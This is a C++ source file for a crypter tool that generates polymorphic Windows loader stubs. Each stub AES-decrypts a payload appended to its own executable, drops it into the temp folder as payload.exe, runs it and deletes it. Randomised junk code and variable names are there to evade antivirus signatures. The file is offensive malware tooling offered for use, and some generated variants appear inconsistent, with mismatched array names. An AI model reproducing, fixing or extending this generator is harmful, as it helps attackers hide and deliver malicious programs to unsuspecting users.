#include <iostream>
#include <fstream>
#include <vector>
#include <string>
#include <random>
#include <sstream>
#include <map>
#include <algorithm>
#include <openssl/evp.h>

constexpr uint8_t XOR_OBFUSCATE_KEY = 0x5A;

uint8_t encKey[] = { 0x39,0x39,0x08,0x0F,0x0F,0x38,0x08,0x31,0x38,0x32,0x38 };
constexpr size_t keyLen = sizeof(encKey);

// Polymorphic code templates
struct CodeTemplate {
    std::string name;
    std::vector<std::string> variants;
};

class PolymorphicStubGenerator {
private:
    std::mt19937 rng;
    std::vector<CodeTemplate> templates;
    std::map<std::string, std::vector<std::string>> variableNames;
    
public:
    PolymorphicStubGenerator() : rng(std::random_device{}()) {
        initializeTemplates();
        initializeVariableNames();
    }
    
    void initializeTemplates() {
        // Key decryption templates
        templates.push_back({
            "key_decrypt",
            {
                "for (size_t i = 0; i < keyLen; ++i) { keyBuf[i] = encKey[i] ^ XOR_OBFUSCATE_KEY; }",
                "for (size_t idx = 0; idx < keyLen; idx++) { keyBuf[idx] = encKey[idx] ^ XOR_OBFUSCATE_KEY; }",
                "size_t pos = 0; while (pos < keyLen) { keyBuf[pos] = encKey[pos] ^ XOR_OBFUSCATE_KEY; pos++; }",
                "for (auto i = 0u; i < keyLen; i++) { keyBuf[i] = encKey[i] ^ XOR_OBFUSCATE_KEY; }"
            }
        });
        
        // AES initialization templates
        templates.push_back({
            "aes_init",
            {
                "for (int i = 0; i < 32; i++) { aesKey[i] = key[i % keyLen] ^ (i * 0x37); } for (int i = 0; i < 16; i++) { aesIV[i] = key[i % keyLen] ^ (i * 0x73); }",
                "for (int idx = 0; idx < 32; idx++) { aesKey[idx] = key[idx % keyLen] ^ (idx * 0x37); } for (int idx = 0; idx < 16; idx++) { aesIV[idx] = key[idx % keyLen] ^ (idx * 0x73); }",
                "int pos = 0; while (pos < 32) { aesKey[pos] = key[pos % keyLen] ^ (pos * 0x37); pos++; } pos = 0; while (pos < 16) { aesIV[pos] = key[pos % keyLen] ^ (pos * 0x73); pos++; }"
            }
        });
        
        // File reading templates
        templates.push_back({
            "file_read",
            {
                "fin.seekg(0, std::ios::end); size_t fileSize = fin.tellg(); fin.seekg(0, std::ios::beg); std::vector<uint8_t> buf(fileSize); fin.read(reinterpret_cast<char*>(buf.data()), fileSize);",
                "fin.seekg(0, std::ios::end); auto size = fin.tellg(); fin.seekg(0, std::ios::beg); std::vector<uint8_t> buffer(size); fin.read(reinterpret_cast<char*>(buffer.data()), size);",
                "fin.seekg(0, std::ios::end); long length = fin.tellg(); fin.seekg(0, std::ios::beg); std::vector<uint8_t> data(length); fin.read(reinterpret_cast<char*>(data.data()), length);"
            }
        });
        
        // Junk code templates
        templates.push_back({
            "junk_code",
            {
                "volatile int junk = rand() * 0x1337; if ((junk & 0xFF) == 0x42) { junk++; }",
                "volatile auto noise = std::chrono::high_resolution_clock::now().time_since_epoch().count(); if (noise % 2 == 0) { noise++; }",
                "volatile int trap = __LINE__ * 0xDEADBEEF; if ((trap ^ (trap >> 4)) & 0xF) { trap++; }",
                "volatile long dummy = time(nullptr) * 0xCAFEBABE; if (dummy & 1) { dummy ^= 0x12345678; }"
            }
        });
        
        // Execution templates
        templates.push_back({
            "execute_file",
            {
                "SHELLEXECUTEINFOA sei = { sizeof(sei) }; sei.fMask = SEE_MASK_NOCLOSEPROCESS; sei.lpFile = tempPath; sei.nShow = SW_SHOW; if (!ShellExecuteExA(&sei) || !sei.hProcess) return 1; WaitForSingleObject(sei.hProcess, INFINITE); CloseHandle(sei.hProcess);",
                "SHELLEXECUTEINFOA execInfo = { sizeof(execInfo) }; execInfo.fMask = SEE_MASK_NOCLOSEPROCESS; execInfo.lpFile = tempPath; execInfo.nShow = SW_SHOW; if (!ShellExecuteExA(&execInfo) || !execInfo.hProcess) return 1; WaitForSingleObject(execInfo.hProcess, INFINITE); CloseHandle(execInfo.hProcess);"
            }
        });
    }
    
    void initializeVariableNames() {
        variableNames["tempPath"] = {"tempPath", "tempFile", "droppedFile", "execPath", "targetPath"};
        variableNames["buf"] = {"buf", "buffer", "data", "payload", "content"};
        variableNames["key"] = {"key", "keyBuf", "decKey", "keyData", "cryptoKey"};
        variableNames["fin"] = {"fin", "input", "file", "stream", "reader"};
        variableNames["fout"] = {"fout", "output", "outFile", "writer", "dest"};
    }
    
    std::string getRandomTemplate(const std::string& templateName) {
        for (const auto& tmpl : templates) {
            if (tmpl.name == templateName) {
                std::uniform_int_distribution<> dis(0, tmpl.variants.size() - 1);
                return tmpl.variants[dis(rng)];
            }
        }
        return "";
    }
    
    std::string getRandomVariableName(const std::string& baseName) {
        auto it = variableNames.find(baseName);
        if (it != variableNames.end()) {
            std::uniform_int_distribution<> dis(0, it->second.size() - 1);
            return it->second[dis(rng)];
        }
        return baseName;
    }
    
    std::string generateRandomJunkFunction() {
        std::vector<std::string> junkFunctions = {
            "bool junkTrap(int x) { volatile int junk = x * 0x1337; return ((junk ^ (junk >> 3)) & 0x7) == 5; }",
            "bool noiseCheck(int val) { volatile int noise = val * 0xDEADBEEF; return ((noise & 0xFF) ^ 0x42) == 0x37; }",
            "bool dummyTest(int input) { volatile long dummy = input * 0xCAFEBABE; return (dummy & 0xF) == 0xA; }",
            "bool trapFunction(int param) { volatile int trap = param * 0x12345678; return ((trap >> 2) & 0x3) == 1; }"
        };
        
        std::uniform_int_distribution<> dis(0, junkFunctions.size() - 1);
        return junkFunctions[dis(rng)];
    }
    
    std::string generateRandomIncludes() {
        std::vector<std::string> includeSets = {
            "#include <windows.h>\n#include <shellapi.h>\n#include <vector>\n#include <cstdio>\n#include <cstring>\n#include <openssl/evp.h>",
            "#include <windows.h>\n#include <shellapi.h>\n#include <vector>\n#include <cstdio>\n#include <cstring>\n#include <openssl/evp.h>\n#include <chrono>",
            "#include <windows.h>\n#include <shellapi.h>\n#include <vector>\n#include <cstdio>\n#include <cstring>\n#include <openssl/evp.h>\n#include <random>"
        };
        
        std::uniform_int_distribution<> dis(0, includeSets.size() - 1);
        return includeSets[dis(rng)];
    }
    
    std::string generateRandomConstants() {
        std::vector<std::string> constantSets = {
            "constexpr const char* MARKER = \"ENCRYPTED_PAYLOAD_START\";\nconstexpr size_t MARKER_LEN = 22;",
            "constexpr const char* PAYLOAD_MARKER = \"ENCRYPTED_PAYLOAD_START\";\nconstexpr size_t MARKER_SIZE = 22;",
            "constexpr const char* SIGNATURE = \"ENCRYPTED_PAYLOAD_START\";\nconstexpr size_t SIGNATURE_LEN = 22;"
        };
        
        std::uniform_int_distribution<> dis(0, constantSets.size() - 1);
        return constantSets[dis(rng)];
    }
    
    std::string generateRandomKeyArrays() {
        std::vector<std::string> keyArraySets = {
            "uint8_t encryptedKey[] = { 0x39,0x39,0x08,0x0F,0x0F,0x38,0x08,0x31,0x38,0x32,0x38 };\nuint8_t mask[] = { 0x63,0x63,0x60,0x55,0x55,0x6A,0x60,0x5B,0x6A,0x68,0x6A };\nconstexpr size_t keyLen = sizeof(encryptedKey);",
            "uint8_t encKey[] = { 0x39,0x39,0x08,0x0F,0x0F,0x38,0x08,0x31,0x38,0x32,0x38 };\nuint8_t keyMask[] = { 0x63,0x63,0x60,0x55,0x55,0x6A,0x60,0x5B,0x6A,0x68,0x6A };\nconstexpr size_t keyLen = sizeof(encKey);",
            "uint8_t cryptoKey[] = { 0x39,0x39,0x08,0x0F,0x0F,0x38,0x08,0x31,0x38,0x32,0x38 };\nuint8_t xorMask[] = { 0x63,0x63,0x60,0x55,0x55,0x6A,0x60,0x5B,0x6A,0x68,0x6A };\nconstexpr size_t keyLen = sizeof(cryptoKey);"
        };
        
        std::uniform_int_distribution<> dis(0, keyArraySets.size() - 1);
        return keyArraySets[dis(rng)];
    }
    
    std::string generateRandomAESArrays() {
        std::vector<std::string> aesArraySets = {
            "uint8_t aesKey[32];\nuint8_t aesIV[16];",
            "uint8_t cryptoKey[32];\nuint8_t initVector[16];",
            "uint8_t encryptionKey[32];\nuint8_t iv[16];"
        };
        
        std::uniform_int_distribution<> dis(0, aesArraySets.size() - 1);
        return aesArraySets[dis(rng)];
    }
    
    std::string generateStub() {
        std::stringstream ss;
        
        // Generate random includes
        ss << generateRandomIncludes() << "\n\n";
        
        // Generate random constants
        ss << generateRandomConstants() << "\n\n";
        
        // Generate random key arrays
        ss << generateRandomKeyArrays() << "\n\n";
        
        // Generate random AES arrays
        ss << generateRandomAESArrays() << "\n\n";
        
        // Generate random junk function
        ss << generateRandomJunkFunction() << "\n\n";
        
        // Generate key decryption function
        std::string keyDecrypt = getRandomTemplate("key_decrypt");
        std::string keyVar = getRandomVariableName("key");
        std::string keyBufVar = getRandomVariableName("keyBuf");
        std::string encKeyVar = getRandomVariableName("encKey");
        std::string maskVar = getRandomVariableName("mask");
        
        // Replace variables in key decryption
        std::string keyDecryptFunc = "void decryptKey(uint8_t* " + keyBufVar + ") {\n    " + keyDecrypt + "\n}\n\n";
        
        // Generate AES initialization function
        std::string aesInit = getRandomTemplate("aes_init");
        std::string aesKeyVar = getRandomVariableName("aesKey");
        std::string aesIVVar = getRandomVariableName("aesIV");
        
        std::string aesInitFunc = "void initializeAES() {\n    uint8_t " + keyVar + "[keyLen];\n    decryptKey(" + keyVar + ");\n    " + aesInit + "\n}\n\n";
        
        // Generate AES decryption function
        std::string aesDecryptFunc = "bool decryptAES(const std::vector<uint8_t>& input, std::vector<uint8_t>& output) {\n    EVP_CIPHER_CTX* ctx = EVP_CIPHER_CTX_new();\n    if (!ctx) return false;\n    if (EVP_DecryptInit_ex(ctx, EVP_aes_256_cbc(), NULL, " + aesKeyVar + ", " + aesIVVar + ") != 1) {\n        EVP_CIPHER_CTX_free(ctx);\n        return false;\n    }\n    output.resize(input.size());\n    int outLen;\n    if (EVP_DecryptUpdate(ctx, output.data(), &outLen, input.data(), input.size()) != 1) {\n        EVP_CIPHER_CTX_free(ctx);\n        return false;\n    }\n    int finalLen;\n    if (EVP_DecryptFinal_ex(ctx, output.data() + outLen, &finalLen) != 1) {\n        EVP_CIPHER_CTX_free(ctx);\n        return false;\n    }\n    output.resize(outLen + finalLen);\n    EVP_CIPHER_CTX_free(ctx);\n    return true;\n}\n\n";
        
        // Generate main function
        std::string mainFunc = generateMainFunction();
        
        ss << keyDecryptFunc << aesInitFunc << aesDecryptFunc << mainFunc;
        
        return ss.str();
    }
    
    std::string generateMainFunction() {
        std::stringstream ss;
        
        std::string junkFuncName = "junkTrap";
        std::uniform_int_distribution<> dis(0, 3);
        switch (dis(rng)) {
            case 0: junkFuncName = "junkTrap"; break;
            case 1: junkFuncName = "noiseCheck"; break;
            case 2: junkFuncName = "dummyTest"; break;
            case 3: junkFuncName = "trapFunction"; break;
        }
        
        ss << "int WINAPI WinMain(HINSTANCE, HINSTANCE, LPSTR, int) {\n";
        ss << "    char selfPath[MAX_PATH];\n";
        ss << "    GetModuleFileNameA(NULL, selfPath, MAX_PATH);\n\n";
        
        ss << "    FILE* f = nullptr;\n";
        ss << "    if (fopen_s(&f, selfPath, \"rb\") != 0 || !f) return 1;\n\n";
        
        ss << "    fseek(f, 0, SEEK_END);\n";
        ss << "    long size = ftell(f);\n";
        ss << "    fseek(f, 0, SEEK_SET);\n\n";
        
        std::string bufVar = getRandomVariableName("buf");
        ss << "    std::vector<uint8_t> " << bufVar << "(size);\n";
        ss << "    fread(" << bufVar << ".data(), 1, size, f);\n";
        ss << "    fclose(f);\n\n";
        
        ss << "    size_t payloadOffset = 0;\n";
        ss << "    for (size_t i = 0; i + MARKER_LEN < " << bufVar << ".size(); i++) {\n";
        ss << "        if (memcmp(" << bufVar << ".data() + i, MARKER, MARKER_LEN) == 0) {\n";
        ss << "            payloadOffset = i + MARKER_LEN;\n";
        ss << "            break;\n";
        ss << "        }\n";
        ss << "    }\n";
        ss << "    if (payloadOffset == 0) return 1;\n\n";
        
        std::string payloadVar = getRandomVariableName("payload");
        ss << "    std::vector<uint8_t> " << payloadVar << "(" << bufVar << ".begin() + payloadOffset, " << bufVar << ".end());\n\n";
        
        ss << "    initializeAES();\n\n";
        
        std::string decryptedVar = getRandomVariableName("decrypted");
        ss << "    std::vector<uint8_t> " << decryptedVar << ";\n";
        ss << "    if (!decryptAES(" << payloadVar << ", " << decryptedVar << ")) {\n";
        ss << "        return 1;\n";
        ss << "    }\n\n";
        
        ss << "    if (" << junkFuncName << "((int)" << decryptedVar << ".size())) {\n";
        ss << "        volatile int x = 42 * 1337;\n";
        ss << "        (void)x;\n";
        ss << "    }\n\n";
        
        std::string tempPathVar = getRandomVariableName("tempPath");
        ss << "    char " << tempPathVar << "[MAX_PATH];\n";
        ss << "    GetTempPathA(MAX_PATH, " << tempPathVar << ");\n";
        ss << "    strcat_s(" << tempPathVar << ", \"payload.exe\");\n\n";
        
        ss << "    FILE* out = nullptr;\n";
        ss << "    if (fopen_s(&out, " << tempPathVar << ", \"wb\") != 0 || !out) return 1;\n\n";
        
        ss << "    fwrite(" << decryptedVar << ".data(), 1, " << decryptedVar << ".size(), out);\n";
        ss << "    fclose(out);\n\n";
        
        std::string execCode = getRandomTemplate("execute_file");
        std::string tempPathReplacement = getRandomVariableName("tempPath");
        // Replace tempPath in execution code
        size_t pos = execCode.find("tempPath");
        if (pos != std::string::npos) {
            execCode.replace(pos, 8, tempPathReplacement);
        }
        
        ss << "    " << execCode << "\n\n";
        
        ss << "    DeleteFileA(" << tempPathVar << ");\n\n";
        ss << "    return 0;\n";
        ss << "}\n";
        
        return ss.str();
    }
    
    void generateStubFile(const std::string& filename) {
        std::ofstream outFile(filename);
        if (!outFile) {
            std::cerr << "Failed to create stub file: " << filename << std::endl;
            return;
        }
        
        std::string stub = generateStub();
        outFile << stub;
        outFile.close();
        
        std::cout << "Generated polymorphic stub: " << filename << std::endl;
    }
    
    void generateMultipleStubs(int count, const std::string& prefix = "stub") {
        for (int i = 0; i < count; i++) {
            std::string filename = prefix + "_" + std::to_string(i) + ".cpp";
            generateStubFile(filename);
        }
    }
};

int main(int argc, char* argv[]) {
    if (argc < 2) {
        std::cout << "Polymorphic Stub Generator\n";
        std::cout << "Usage:\n";
        std::cout << "  stub_generator.exe <count> [prefix]\n";
        std::cout << "  stub_generator.exe --single <filename>\n";
        std::cout << "\nExamples:\n";
        std::cout << "  stub_generator.exe 10          # Generate 10 stubs with default prefix\n";
        std::cout << "  stub_generator.exe 5 my_stub    # Generate 5 stubs with 'my_stub' prefix\n";
        std::cout << "  stub_generator.exe --single stub.cpp  # Generate single stub\n";
        return 1;
    }
    
    PolymorphicStubGenerator generator;
    
    if (std::string(argv[1]) == "--single") {
        if (argc < 3) {
            std::cerr << "Missing filename for single stub generation." << std::endl;
            return 1;
        }
        generator.generateStubFile(argv[2]);
    } else {
        int count = std::stoi(argv[1]);
        std::string prefix = (argc > 2) ? argv[2] : "stub";
        
        std::cout << "Generating " << count << " polymorphic stubs with prefix '" << prefix << "'..." << std::endl;
        generator.generateMultipleStubs(count, prefix);
        std::cout << "Generation complete!" << std::endl;
    }
    
    return 0;
}